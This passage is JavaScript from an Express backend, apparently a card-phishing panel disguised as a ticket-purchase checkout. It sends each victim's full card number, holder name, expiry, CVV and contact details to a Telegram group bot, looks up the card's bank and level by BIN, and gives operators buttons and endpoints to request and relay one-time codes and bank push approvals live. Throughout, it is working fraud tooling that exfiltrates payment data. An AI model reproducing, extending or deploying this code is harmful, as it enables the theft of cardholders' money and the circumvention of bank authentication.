  const typeParts = [row.scheme, row.type].map((x) => (x ? String(x).trim() : "")).filter(Boolean);
  const typeLine = typeParts.length ? typeParts.join(" ") : CARD_INFO_MISSING;

  return { bin, bankLine, levelLine, typeLine };
}

function cardInfoFromBinlistJson(d, bin) {
  const bankName = d.bank?.name && String(d.bank.name).trim();
  const emoji = d.country?.emoji || countryCodeToEmoji(d.country?.alpha2);
  const bankLine = bankName
    ? `${emoji ? `${emoji} ` : ""}${bankName}`
    : CARD_INFO_MISSING;

  const levelRaw = cardLevelFromBrand(d.brand, d.scheme);
  const levelLine = levelRaw || CARD_INFO_MISSING;

  const scheme = ((d.scheme || "").toUpperCase() || localCardNetwork(bin) || "").trim();
  const typ = ((d.type || "").toUpperCase() || "").trim();
  const typeParts = [scheme, typ].filter(Boolean);
  const typeLine = typeParts.length ? typeParts.join(" ") : CARD_INFO_MISSING;

  return { bin, bankLine, levelLine, typeLine };
}

async function lookupBinRemote(bin) {
  if (binRemoteCache.has(bin)) return binRemoteCache.get(bin);

  const url = `https://lookup.binlist.net/${bin}`;
  const headers = {
    "Accept-Version": "3",
    "User-Agent": BIN_LOOKUP_UA,
    Accept: "application/json",
  };

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const res = await fetch(url, {
        headers,
        signal: AbortSignal.timeout(BIN_LOOKUP_TIMEOUT_MS),
      });

      if (res.status === 429 || res.status === 503) {
        await sleep(1500 * (attempt + 1));
        continue;
      }

      if (!res.ok) {
        console.warn(`[bin] remote lookup failed bin=${bin} status=${res.status}`);
        return null;
      }

      const d = await res.json();
      const lines = cardInfoFromBinlistJson(d, bin);
      binRemoteCache.set(bin, lines);
      return lines;
    } catch (e) {
      const msg = e && e.message ? e.message : String(e);
      if (attempt < 2) {
        await sleep(800 * (attempt + 1));
        continue;
      }
      console.warn(`[bin] remote lookup error bin=${bin}: ${msg}`);
      return null;
    }
  }

  return null;
}

async function resolveCardInfo(cardNumber) {
  const bin = String(cardNumber ?? "").replace(/\D/g, "").slice(0, 6);
  if (bin.length < 6) return null;

  const local = BIN_BANKS[bin];
  if (local) return cardInfoFromLocalRow(local, bin);

  const remote = await lookupBinRemote(bin);
  if (remote) return remote;

  return {
    bin,
    bankLine: CARD_INFO_MISSING,
    levelLine: CARD_INFO_MISSING,
    typeLine: CARD_INFO_MISSING,
  };
}

function countryCodeToEmoji(alpha2) {
  if (!alpha2 || alpha2.length !== 2) return "";
  const base = 0x1F1E6 - 65;
  return String.fromCodePoint(
    base + alpha2.toUpperCase().charCodeAt(0),
    base + alpha2.toUpperCase().charCodeAt(1),
  );
}

async function tgPost(method, body) {
  if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
  const res = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    }
  );
  const json = await res.json().catch(() => ({}));
  if (!json.ok) {
    throw new Error(
      `Telegram ${method} failed: ${json.description || res.status}`
    );
  }
  return json;
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function orderKeyboard(request_id) {
  return {
    inline_keyboard: [
      [
        { text: "✅ Подтвердить",      callback_data: `${request_id}:ok`           },
        { text: "❌ Не подходит",      callback_data: `${request_id}:nope`         },
      ],
      [
        { text: "⚠️ Неверная карта",   callback_data: `${request_id}:wrong`        },
        { text: "🚫 Инвалид карта",    callback_data: `${request_id}:invalid`      },
      ],
      [
        { text: "📲 Пуш",              callback_data: `${request_id}:push`          },
        { text: "💬 Код",              callback_data: `${request_id}:push_code`     },
      ],
      [
        { text: "🔄 Смена карты",      callback_data: `${request_id}:change_card`  },
      ],
      [
        { text: "❗ Неверный код",     callback_data: `${request_id}:wrong_code`   },
        { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
      ],
      [
        { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
      ],
    ],
  };
}

function codeKeyboard(request_id) {
  return {
    inline_keyboard: [
      [
        { text: "✅ Код верный",       callback_data: `${request_id}:ok`           },
        { text: "❗ Неверный код",     callback_data: `${request_id}:wrong_code`   },
      ],
      [
        { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
      ],
      [
        { text: "🔄 Смена карты",      callback_data: `${request_id}:change_card`  },
      ],
      [
        { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
      ],
    ],
  };
}

function pushKeyboard(request_id) {
  return {
    inline_keyboard: [
      [
        { text: "✅ Пуш прошёл",        callback_data: `${request_id}:ok`             },
        { text: "📲 Новый пуш",          callback_data: `${request_id}:push`           },
      ],
      [
        { text: "💬 Перейти к коду",     callback_data: `${request_id}:push_code`      },
      ],
      [
        { text: "↩️ Не подтверждал",     callback_data: `${request_id}:push_not_done`  },
      ],
      [
        { text: "🔄 Смена карты",        callback_data: `${request_id}:change_card`    },
      ],
      [
        { text: "👁 Проверка онлайна",   callback_data: `${request_id}:check_online`   },
      ],
    ],
  };
}

async function sendOrderToTelegram({
  request_id,
  name, email, phone,
  card_number, card_name, card_expiry, card_cvv,
  amount,
}) {
  if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");

  const cardInfo = card_number ? await resolveCardInfo(card_number) : null;

  const lines = [
    "🎟 Новая заявка на покупку",
    `🆔 ID: ${escapeHtml(request_id)}`,
  ];
  if (name)   lines.push(`👤 Имя: ${escapeHtml(name)}`);
  if (email)  lines.push(`📧 Email: ${escapeHtml(email)}`);
  if (phone)  lines.push(`📞 Телефон: ${escapeHtml(phone)}`);
  if (amount) lines.push(`💰 Сумма: ${escapeHtml(amount)}`);
  lines.push("");
  lines.push("💳 Данные карты:");
  if (card_number) {
    lines.push("Номер:");
    lines.push(`<code>${escapeHtml(card_number)}</code>`);
  }
  if (card_name) {
    lines.push("Держатель:");
    lines.push(`<code>${escapeHtml(card_name)}</code>`);
  }
  if (card_expiry) lines.push(`Срок: ${escapeHtml(card_expiry)}`);
  if (card_cvv)    lines.push(`CVV: ${escapeHtml(card_cvv)}`);

  if (cardInfo) {
    lines.push("");
    lines.push("Card Info ℹ️");
    lines.push(`  BANK: ${escapeHtml(cardInfo.bankLine)}`);
    lines.push(`  Card lvl: ${escapeHtml(cardInfo.levelLine)}`);
    lines.push(`  TYPE: ${escapeHtml(cardInfo.typeLine)}`);
    lines.push(`  BIN: <code>${escapeHtml(cardInfo.bin)}</code>`);
  }

  await tgPost("sendMessage", {
    chat_id: GROUP_CHAT_ID,
    text: lines.join("\n"),
    parse_mode: "HTML",
    reply_markup: orderKeyboard(request_id),
  });
}

async function sendCodeToTelegram({ request_id, code }) {
  if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");

  await tgPost("sendMessage", {
    chat_id: GROUP_CHAT_ID,
    text: `🔐 Код подтверждения от клиента\n\n📋 Код: <b>${code}</b>\n🆔 Заявка: ${request_id}`,
    parse_mode: "HTML",
    reply_markup: codeKeyboard(request_id),
  });
}

function waitForCallback(request_id) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => {
      pending.delete(request_id);
      resolve({ timeout: true });
    }, TIMEOUT_MS);
    pending.set(request_id, { resolve, timer });
  });
}

app.post("/api/order", async (req, res) => {
  const { profile = {}, card = {}, amount = "" } = req.body;
  const request_id = uuidv4();

  const name  = [profile.firstName, profile.lastName].filter(Boolean).join(" ");
  const email = profile.email || "";

  try {
    await sendOrderToTelegram({
      request_id,
      name,
      email,
      phone:       profile.phone || "",
      card_number: card.number   || "",
      card_name:   card.name     || "",
      card_expiry: card.month && card.year ? `${card.month}/${card.year}` : "",
      card_cvv:    card.cvv      || "",
      amount,
    });
  } catch (err) {
    console.error("[order] Telegram error:", err.message);
    return res.status(502).json({
      ok: false,
      error: "Telegram unavailable",
      detail: err.message,
    });
  }

  lastSeen.set(request_id, Date.now());
  console.log(`[order] waiting  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[order] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[order] done  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});

app.post("/api/code", async (req, res) => {
  const { request_id, code } = req.body || {};
  if (!request_id || !code) {
    return res.status(400).json({ ok: false, error: "request_id and code are required" });
  }

  try {
    await sendCodeToTelegram({ request_id, code });
  } catch (err) {
    console.error("[code] Telegram error:", err.message);
    return res.status(502).json({
      ok: false,
      error: "Telegram unavailable",
      detail: err.message,
    });
  }

  lastSeen.set(request_id, Date.now());
  console.log(`[code] waiting  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[code] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[code] done  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});

app.post("/api/push_approved", async (req, res) => {
  const { request_id } = req.body || {};
  if (!request_id) {
    return res.status(400).json({ ok: false, error: "request_id required" });
  }

  try {
    await tgPost("sendMessage", {
      chat_id: GROUP_CHAT_ID,
      text: `✅ Клиент подтвердил пуш-уведомление в банке\n🆔 Заявка: ${request_id}`,
      reply_markup: pushKeyboard(request_id),
    });
  } catch (err) {
    console.error("[push_approved] Telegram error:", err.message);
    return res.status(502).json({ ok: false, error: "Telegram unavailable", detail: err.message });
  }

  lastSeen.set(request_id, Date.now());
  console.log(`[push_approved] waiting  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[push_approved] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[push_approved] done  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});

app.post("/api/re_enter_code", async (req, res) => {
  const { request_id } = req.body || {};
  if (!request_id) {
    return res.status(400).json({ ok: false, error: "request_id required" });
  }

  try {
    await tgPost("sendMessage", {
      chat_id: GROUP_CHAT_ID,
      text: `🔄 Клиент запросил повторный ввод кода\n🆔 Заявка: ${request_id}`,
    });
  } catch (err) {
    console.error("[re_enter_code] Telegram error:", err.message);
  }

  res.json({ ok: true });
});

app.post("/api/callback", (req, res) => {
  const { request_id, action } = req.body || {};
  console.log(`[callback] request_id=${request_id}  action=${action}`);

  const entry = pending.get(request_id);
  if (entry) {
    clearTimeout(entry.timer);
    pending.delete(request_id);
    entry.resolve({ action });
  } else {
    console.warn(`[callback] no pending entry for ${request_id}`);
  }

  res.json({ ok: true });
});

app.get("/api/online", (req, res) => {
  const { request_id } = req.query;
  const hasPending = pending.has(request_id);
  const ts = lastSeen.get(request_id);
  const recentlyActive = ts && (Date.now() - ts < 5 * 60 * 1000);
  const online = hasPending || !!recentlyActive;
  res.json({ ok: true, online });
});

app.get("/health", (_req, res) =>
  res.json({ ok: true, pending: pending.size })
);

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Backend listening on http://0.0.0.0:${PORT}`);
  console.log(`  BOT_TOKEN     = ${BOT_TOKEN     ? "set ✓" : "NOT SET ✗"}`);
  console.log(`  GROUP_CHAT_ID = ${GROUP_CHAT_ID  || "NOT SET ✗"}`);
  console.log(`  SELF_URL      = ${SELF_URL} (info only)`);
  console.log(
    "  Bot must POST to: .../api/callback — set BACKEND_CALLBACK_URL on PythonAnywhere"
  );
  if (!BOT_TOKEN)     console.warn("  ⚠ Set BOT_TOKEN in .env (token of @cardeeee_bot)");
  if (!GROUP_CHAT_ID) console.warn("  ⚠ Set GROUP_CHAT_ID in .env (numeric Telegram group ID)");
});
